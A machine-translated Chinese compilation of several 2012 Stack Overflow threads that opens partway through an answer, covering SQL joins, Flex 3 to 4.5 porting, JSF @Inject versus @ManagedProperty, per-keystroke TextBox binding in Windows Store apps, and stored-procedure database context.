因此，由于我们实际上在两个原始查询中提取了相同的信息，只有一个不同的条件……我们可以将修饰符listitem.name 移动到连接子句中，然后再次使用不同的条件连接到同一个表。然后我们根据我们使用的条件（大小、颜色）为表格设置别名。这样您就可以引用别名并提取正确的项目 ID，然后一次将它们连接起来。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T13:08:59.617

试试这个：

您只需要将查询作为派生表并加入 ItemID

```
Select a.SizeItemID+'-'+b.ColorItemID as FinalItemID
FROM
    (SELECT  Products.ItemID, Products.ItemID + '-' + ModifierListItems.ItemID AS SizeItemID
    FROM         ModifierLists INNER JOIN
                          ProductModifierLists ON ModifierLists.ModifierListID = ProductModifierLists.ModifierListID INNER JOIN
                          ModifierListItems ON ModifierLists.ModifierListID = ModifierListItems.ModifierListID INNER JOIN
                          Products ON ProductModifierLists.ItemID = Products.ItemID AND ProductModifierLists.ManufacturerID = Products.ManufacturerID
    WHERE     (Products.ManufacturerID = 262) AND ModifierListName='Size'
    )a
JOIN
    (SELECT  Products.ItemID, ModifierListItems.ItemID AS ColorItemID
    FROM         ModifierLists INNER JOIN
                          ProductModifierLists ON ModifierLists.ModifierListID = ProductModifierLists.ModifierListID INNER JOIN
                          ModifierListItems ON ModifierLists.ModifierListID = ModifierListItems.ModifierListID INNER JOIN
                          Products ON ProductModifierLists.ItemID = Products.ItemID AND ProductModifierLists.ManufacturerID = Products.ManufacturerID
    WHERE     (Products.ManufacturerID = 262) AND ModifierListName='Color'
    )b
on a.ItemID=b.ItemID
ORDER BY  a.FinalItemID 
```

# apache-flex - 将自定义日历组件从 flex 3 移植到 flex 4.5

> ID：12215977
> 
> 赞同：0
> 
> 时间：2012-08-31T13:06:06.837
> 
> 标签：apache-flex, calendar, flex4, adobe, flex3

[我从 flex 3 中的http://www.chadupton.com/blog/2009/02/flex-calendar-component/](https://www.chadupton.com/blog/2009/02/flex-calendar-component/)获得了一个日历组件，我尝试将其移植到 flex 4.5 并采取了[http 中建议的必要操作： //www.adobe.com/devnet/flex/articles/migrating-flex-apps-part1.html](http://www.adobe.com/devnet/flex/articles/migrating-flex-apps-part1.html)但在移植时出现问题，如下图所示，图像 1 来自 flex 3，图像 2 来自 flex 4.5。任何帮助或建议都会有所帮助。并提前感谢。

[![弹性 3 图像](../Images/7ed6d758bf74f10d80aa9cf3fd7e31e5.png)](https://i.stack.imgur.com/XnlTm.png) [![flex 4.5 图片](../Images/20f899fcc1faa83b29c3da6febbe61d8.png)](https://i.stack.imgur.com/8bDhq.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T14:26:48.927

看看这篇[文章](http://www.learnosity.com/techblog/index.cfm/2010/3/21/Flex-3-to-Flex-4-Migration-Howto)，当我做迁移时，它真的帮助了我，基本上你需要的就是它。

# jsf - 注入 vs ManagedProperty

> ID：12215979
> 
> 赞同：12
> 
> 时间：2012-08-31T13:06:12.917
> 
> 标签：jsf, cdi, managed-bean

好的，所以我有一个需要引用另一个 (@NoneScoped) bean 的 JSF 支持 bean。

我应该@Inject 还是使用@ManagedProperty 从容器中获取实例引用？

为什么使用一种而不是另一种，在我看来，这两种方法可以达到同样的目的。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-31T13:20:21.883

`@ManagedProperty``@NoneScoped`来自 JSF 2.0 规范，而来自`@Inject`CDI 规范。

如果您只是在开发一个不使用任何其他 JavaEE 6 特性的 servlet 应用程序，那么请选择`@ManagedProperty`. 该注释也有一个优势`@Inject`：您可以将 EL（表达式语言）与它一起使用（[尽管在 CDI 中有解决方法](http://illegalargumentexception.blogspot.co.uk/2012/07/jsf-cdi-and-el.html)）。

两个注释/容器似乎都实现了“*同一件事*”，但方式却截然不同，并且它们与不同的容器一起工作。由 CDI 管理的 Bean 将可用于 JSF，但反之则不行。如果您使用 JSF 特定的注释来注释您的 bean，那么请忘记使用自定义限定符、拦截器、生产者方法等。我通常更喜欢使用 CDI 的方法，因为最后它更复杂，但选择取决于您的实际需求.

总结一下，因为您似乎只是在使用 JSF 功能然后**坚持使用`@ManagedProperty`**（CDI 无法理解注释，在 CDI 中，如果没有指定`@NoneScoped`，所有 bean 都在范围内）。`@Default`在您的项目中切换到 CDI 可能意味着不仅要替换`@ManagedProperty`一个`@Inject`，而且要替换所有`@RequestScoped`CDI 特定的（等等）。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-31T13:58:24.890

只要有可能，我会更喜欢 CDI 而不是托管 bean。CDI 在部署时依赖检查方面更丰富，其代理支持可防止范围泄漏。这样可以更轻松地验证模型的正确性。[生产者](http://docs.oracle.com/javaee/6/api/javax/enterprise/inject/Produces.html)通常可用于在必要时提供胶水代码。

*   [CDI 规范](http://jcp.org/en/jsr/detail?id=299)
*   [关于 CDI 和 EL 的博客文章](http://illegalargumentexception.blogspot.co.uk/2012/07/jsf-cdi-and-el.html)

# wpf - Windows 8/RT/Store TextBox - 每次击键后更新文本绑定

> ID：12215980
> 
> 赞同：2
> 
> 时间：2012-08-31T13:06:15.827
> 
> 标签：wpf, data-binding, mvvm, windows-store-apps

有没有办法在每次击键后更新文本绑定？

我的 WPF 自定义 TextBox 使用 KeyUp 事件

```
private void MyTextBox_KeyUp(object sender, System.Windows.Input.KeyEventArgs e)
{
    BindingExpression BE = GetBindingExpression(TextBox.TextProperty);
    if (BE != null)
        BE.UpdateSource();
} 
```

但在**Windows 8/RT/Store**`BindingExpression`中不存在。

 *** * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-03-24T19:30:50.170

我知道这个问题有点老了，但是我今天遇到了这个问题并找到了一个非常简单的解决方案。也许它可以帮助某人：

```
<TextBox Text="{Binding BindingSource, UpdateSourceTrigger=PropertyChanged}"/> 
```

将 UpdateSourceTrigger-Property 设置为“PropertyChanged”时，每次文本更改时都会调用 UpdateSource()-方法（即使焦点没有丢失）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T15:20:05.677

那么，您确定文本已正确绑定吗？确保您绑定到的对象继承了 INotifyPropertyChanged 接口，并且您正在调用 NotifyProperty() 事件的公共字符串属性。

因此，如果您已正确绑定所有内容，您只需设置 TextBox 文本，XAML 将自动更新该值。

这是关于数据绑定的教程：http: [//msdn.microsoft.com/en-us/library/ms752347.aspx](http://msdn.microsoft.com/en-us/library/ms752347.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-09-16T17:52:28.703

您应该使用`TextChanged`而不是`KeyUp`或`KeyDown`

[如何使用 C# 在 WinRT 中立即更新 TextBox 的源](http://marcominerva.wordpress.com/2013/03/14/how-to-immediately-update-the-source-of-a-textbox-in-winrt/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-10-02T08:12:23.767

有办法使用附加属性来解决您的问题。检查[如何使 TextBox.Text 工作](http://www.inexika.com/blog/textbox-text-how-to)文章。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-16T09:09:55.003

我可以向您建议一种完成此任务的方法，这在**Silverlight**的其他版本（WPF 和*primis 中*的 Windows Phone ）上会更容易......

如您所见，`BindingExpression`没有Windows **RT/Store 应用程序！...**

实现此代码，与您的*MVVM 模式*兼容...

```
using System;
using Windows.UI.Xaml;
using Windows.UI.Xaml.Controls;

namespace YourProject
{
    public static class TextBoxEx
    {
        public static string GetRealTimeText(TextBox obj)
        {
            return (string)obj.GetValue(RealTimeTextProperty);
        }

        public static void SetRealTimeText(TextBox obj, string value)
        {
            obj.SetValue(RealTimeTextProperty, value);
        }

        public static readonly DependencyProperty RealTimeTextProperty = DependencyProperty.RegisterAttached("RealTimeText", typeof(string), typeof(TextBoxEx), null);

        public static bool GetIsAutoUpdate(TextBox obj)
        {
            return (bool)obj.GetValue(IsAutoUpdateProperty);
        }

        public static void SetIsAutoUpdate(TextBox obj, bool value)
        {
            obj.SetValue(IsAutoUpdateProperty, value);
        }

        public static readonly DependencyProperty IsAutoUpdateProperty =
            DependencyProperty.RegisterAttached("IsAutoUpdate", typeof(bool), typeof(TextBoxEx), new PropertyMetadata(false, OnIsAutoUpdateChanged));

        private static void OnIsAutoUpdateChanged(DependencyObject sender, DependencyPropertyChangedEventArgs e)
        {
            var textbox = (TextBox)sender;

            if ((bool)e.NewValue)
                textbox.TextChanged += textbox_TextChanged;
            else
                textbox.TextChanged -= textbox_TextChanged;
        }

        private static void textbox_TextChanged(object sender, TextChangedEventArgs e)
        {
            var textbox = (TextBox)sender;

            textbox.SetValue(TextBoxEx.RealTimeTextProperty, textbox.Text);
        }
    }
} 
```

...然后只需在您的 XAML 中使用它，并带有一个小技巧（双重绑定），如下所示...

1）声明新的“实用程序”类：

```
<common:LayoutAwarePage x:Name="pageRoot"
    x:Class="YourProject.YourPage"
    DataContext="{Binding Path=DefaultViewModel, RelativeSource={RelativeSource Self}}"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
    xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
    xmlns:local="YourProject"
    ...
    xmlns:extra="using:YourProject.YourNameSpace"
    mc:Ignorable="d"> 
```

2）在您的控件中实施：

```
<TextBox extra:TextBoxEx.IsAutoUpdate="True"
         extra:TextBoxEx.RealTimeText="{Binding Path=YourTextProperty, Mode=TwoWay}">
    <TextBox.Text>
        <Binding Path="YourTextProperty"
                 Mode="OneWay" />
    </TextBox.Text>
</TextBox> 
```

这对我来说很好，我希望可以帮助你！**

# sql - 一个数据库中的 SQL 存储过程从另一个数据库调用。上下文是什么？

> ID：12215983
> 
> 赞同：4
> 
> 时间：2012-08-31T13:06:23.307
> 
> 标签：sql, sql-server

这是在另一个数据库的上下文中从一个数据库调用存储过程时与上下文相关的问题。

假设我在以下位置创建了一个程序`MainDB`：

```
USE MainDB;
GO

CREATE PROCEDURE dbo.sp_mainproc
    @Login   nvarchar(50),
    @Error   INT               OUTPUT
AS
BEGIN
    -- many details left out...

    -- Login as string must be captured in the xUser table to get
    -- the personal settings for the user...

    SET @_user_id = ( SELECT dbo.xUser.user_id
                      FROM dbo.xUser
                      WHERE dbo.xUser.login = @Login );

    IF( @_user_id IS NULL )
    BEGIN
        -- The user with the given @Login is not present. Indicate the failure.
        SET @Error = 2
        RETURN (1)
    END

    -- Do something in the MainDB. Here the main reason for calling
    -- the stored procedure is implemented.

    -- Indicate the success when finishing.
    SET @Error = 0
    RETURN (0)
END
GO 
```

现在，我想从另一个过程中调用该过程`AuxDB`：

```
USE AuxDB;
GO

CREATE PROCEDURE dbo.sp_action
AS
BEGIN
    -- Call the MainDB.dbo.sp_mainproc to do the action in the MainDB.
    -- The login name must be passed, and possible error must be checked.

    DECLARE @error   INT
    DECLARE @retcode INT

    EXEC @retcode = MainDB.dbo.sp_mainproc
                                  N'the_user',
                                  @error OUTPUT

    IF (@retcode <> 0)
    BEGIN
        -- Here the error must be signalized.
        RETURN 1
    END

    -- Everything OK, let's continue...

    RETURN 0
END
GO 
```

我的问题是：当`MainDB.dbo.sp_mainproc`从内部调用时，在`AuxDB.dbo.sp_action`其中搜索`dbo.xUser`使用的表`sp_mainproc`。是被`MainDB.dbo.xUser`考虑的，还是被`AuxDB.dbo.xUser`搜索的？

谢谢，彼得

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T13:09:25.130

procs 是编译的，所以它会引用`dbo.sp_mainproc`存在于同一个数据库中的对象，因为当 proc 被创建时，它只引用`dbo.xUser`，它没有数据库名称部分

（即无论从哪个数据库调用 proc 都`MainDB.dbo.sp_mainproc`将使用）。`MainDB.dbo.xUser`